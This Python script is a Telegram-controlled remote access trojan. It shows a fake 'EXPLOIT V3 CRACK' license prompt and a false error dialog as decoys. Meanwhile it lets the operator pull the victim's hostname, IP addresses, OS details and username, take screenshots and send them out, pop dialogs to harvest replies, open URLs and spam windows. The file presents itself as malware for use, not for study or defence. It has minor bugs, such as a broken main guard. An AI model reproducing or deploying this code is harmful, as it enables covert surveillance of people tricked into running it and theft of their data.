import os
import platform
import socket
import tkinter as tk
import webbrowser
import subprocess
import threading
from tkinter import simpledialog
import requests
from mss import mss
import telebot
from telebot import types
import json

TELEGRAM_BOT_TOKEN = 'YOUR_TOKEN'
ADMIN_USER_ID = 'YOUR_ID'

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

try:
    external_ip = requests.get('http://ip-api.com/json/', timeout=5).json()
except:
    external_ip = {"status": "fail"}

parent = tk.Tk()
parent.withdraw()

namedia = 'EXPLOIT V3 CRACK'

def login():
    keyk = simpledialog.askstring(namedia, "Enter license key (CRACKED VERSION KEY: SHIT): ", parent=parent)
    if keyk == "SHIT":
        simpledialog.askstring(namedia, 
            "Простите но Exploit не может запуститься. Повторите попытку через 10 минут. Сервера перегруженые. (ERR: 404. No answer)",
            parent=parent)
    else:
        simpledialog.askstring(namedia, "Не верный ключ. Нажмите ОК.", parent=parent)
        login()


@bot.message_handler(commands=['start', 'helpme'])
def help_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    help_text = """
Telegram RAT Bot Commands:
/start или /helpme - Показать это меню
/info - Системная информация
/screen - Сделать скриншот
/calc - Открыть калькулятор
/taskmgr - Открыть диспетчер задач
/msg [текст] - Показать сообщение на ПК
/brow [url] - Открыть сайт в браузере
/ip - Внешний IP адрес
/spam [тип] - Спам окнами (calc/taskmgr)
"""
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
    
    threading.Thread(target=login, daemon=True).start()

@bot.message_handler(commands=['info'])
def info_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "⛔️ Доступ запрещен")
        return
    
    info_text = f"""
System Info:
• Local IP: {local_ip}
• Hostname: {hostname}
• OS: {platform.platform()}
• Processor: {platform.processor()}
• Username: {os.getlogin()}
"""
    bot.send_message(message.chat.id, info_text, parse_mode='Markdown')

@bot.message_handler(commands=['screen'])
def screen_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    try:
        bot.reply_to(message, "Делаю скриншот...")
        
        with mss() as sct:
            filename = "screenshot.png"
            sct.shot(output=filename)
        
        with open(filename, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=f"📸 Скриншот с {local_ip}")
        
        os.remove(filename)
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['calc'])
def calc_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    try:
        subprocess.Popen('calc.exe', shell=True)
        bot.reply_to(message, "Калькулятор запущен")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['taskmgr'])
def taskmgr_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    try:
        subprocess.Popen('taskmgr.exe', shell=True)
        bot.reply_to(message, "Диспетчер задач запущен")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['msg'])
def msg_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    text = message.text.replace('/msg ', '').strip()
    if not text:
        bot.reply_to(message, "Используйте: /msg [текст]")
        return
    
    def show_dialog():
        response = simpledialog.askstring('Windows Dialog', text, parent=parent)
        if response:
            bot.send_message(message.chat.id, f"Ответ с {local_ip}: {response}")
        else:
            bot.send_message(message.chat.id, f"Диалог закрыт на {local_ip}")
    
    threading.Thread(target=show_dialog, daemon=True).start()
    bot.reply_to(message, f"Сообщение отправлено: {text}")

@bot.message_handler(commands=['brow'])
def brow_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    url = message.text.replace('/brow ', '').strip()
    if not url:
        bot.reply_to(message, "Используйте: /brow [url]")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        webbrowser.open(url)
        bot.reply_to(message, f"Открываю: {url}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['ip'])
def ip_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    try:
        ip_info = json.dumps(external_ip, indent=2)
        bot.reply_to(message, f"Внешний IP:\n```json\n{ip_info}\n```", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['spam'])
def spam_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
    
    cmd = message.text.replace('/spam ', '').strip().lower()
    
    def spam_windows():
        try:
            if cmd == 'calc':
                for _ in range(10):
                    subprocess.Popen('calc.exe', shell=True)
                bot.send_message(message.chat.id, "Запущено 10 калькуляторов")
            elif cmd == 'taskmgr':
                for _ in range(5):
                    subprocess.Popen('taskmgr.exe', shell=True)
                bot.send_message(message.chat.id, "Запущено 5 диспетчеров задач")
            else:
                bot.reply_to(message, "Используйте: /spam calc или /spam taskmgr")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка спама: {str(e)}")
    
    if cmd in ['calc', 'taskmgr']:
        threading.Thread(target=spam_windows, daemon=True).start()
        bot.reply_to(message, f"Запускаю спам {cmd}...")
    else:
        bot.reply_to(message, "Используйте: /spam calc или /spam taskmgr")

def start_bot():
    try:
        print(f"[*] Бот запущен для {local_ip}")
        print(f"[*] Ожидание команд от {ADMIN_USER_ID}")
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"[!] Ошибка бота: {e}")
        time.sleep(5)
        start_bot()

if name == "main":
    import time
    start_bot()
